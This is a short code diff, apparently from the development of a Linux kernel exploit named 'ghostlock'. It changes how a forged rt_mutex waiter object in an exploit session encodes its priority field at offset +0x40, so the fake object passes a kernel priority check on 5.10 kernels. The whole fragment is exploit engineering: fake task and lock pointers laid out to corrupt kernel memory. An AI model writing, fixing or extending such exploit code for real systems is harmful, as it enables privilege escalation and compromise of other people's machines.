@@ -316,7 +316,11 @@ namespace ghostlock::route {
                 {7, request->target, "pi_left"},
                 {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                 {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
-                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
+                /* PR #721 parity: the flat 5.10 waiter has no wake_state word,
+                 * so word 10 (+0x40) carries prio alone.  The old split
+                 * encoding (prio<<32)|3 left prio=3 at +0x40 and failed the
+                 * erase's prio>120 gate. */
+                {10, static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO), "prio_flat"},
                 {11, 0, "deadline"},
                 {12, 0, "ww_ctx"},
             };
